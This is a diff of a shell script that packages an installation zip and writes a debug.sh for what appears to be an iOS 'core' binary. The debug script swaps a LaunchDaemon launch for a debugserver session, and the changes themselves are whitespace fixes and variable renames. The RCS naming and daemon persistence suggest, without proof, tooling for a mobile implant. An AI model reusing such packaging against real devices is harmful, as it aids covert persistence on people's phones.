@@ -30,7 +30,7 @@ if [ "$SYNCH_DB" == "NO" ]
 then
 echo "don't synchronize core to DB." > /tmp/db_log.txt
 exit
-fi 
+fi
 
 . ~/.env
 export GEM_HOME=$GEM_HOME
@@ -114,7 +114,7 @@ then
 echo "package created!"
 else
 echo "error: $?"
-fi 
+fi
 
 echo "The installation package is: $OUTPUT_ZIP" >> /tmp/db_log.txt 2>&1
 
@@ -127,7 +127,7 @@ mkdir $OUTPUT_DIR
 # create debug script
 #
 # cat $INSTALL_FILE | sed 's/\$RCS_BASE\/\$RCS_DIR\/\$RCS_CORE > \/dev\/null 2\>\&1.*/\/usr\/sbin\/debugserver-armv6 host:999 .\/\$RCS_CORE\)/' > $OUTPUT_DIR/debug.sh
-cat $INSTALL_FILE | sed 's/\/bin\/launchctl load \/Library\/LaunchDaemons\/\$RCS_LAUNCHD_NAME.plist.*/\(cd \$RCS_BASE\/\$RCS_DIR;\/usr\/sbin\/debugserver-armv6 host:999 .\/\$RCS_CORE\)/' > $OUTPUT_DIR/debug.sh
+cat $INSTALL_FILE | sed 's/\/bin\/launchctl load \/Library\/LaunchDaemons\/\$LAUNCHD_NAME.plist.*/\(cd \$BASE\/\$DIR;\/usr\/sbin\/debugserver-armv6 host:999 .\/\$CORE\)/' > $OUTPUT_DIR/debug.sh
 chmod 755 $OUTPUT_DIR/debug.sh >> /tmp/db_log.txt 2>&1
 
 #
@@ -136,8 +136,8 @@ chmod 755 $OUTPUT_DIR/debug.sh >> /tmp/db_log.txt 2>&1
 echo
 echo "extracting patched core file to $DEBUG_DIR" >> /tmp/db_log.txt 2>&1
 
-RCS_CORE_FILE=`cat $INSTALL_FILE | sed -n 's/RCS_CORE=//p'`
-RCS_CORE_DIR=`cat $INSTALL_FILE | sed -n 's/RCS_DIR=//p'`
+RCS_CORE_FILE=`cat $INSTALL_FILE | sed -n 's/CORE=//p'`
+RCS_CORE_DIR=`cat $INSTALL_FILE | sed -n 's/DIR=//p'`
 
 rm -rf $DEBUG_DIR/private >> /tmp/db_log.txt 2>&1
 mkdir -p $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR >> /tmp/db_log.txt 2>&1
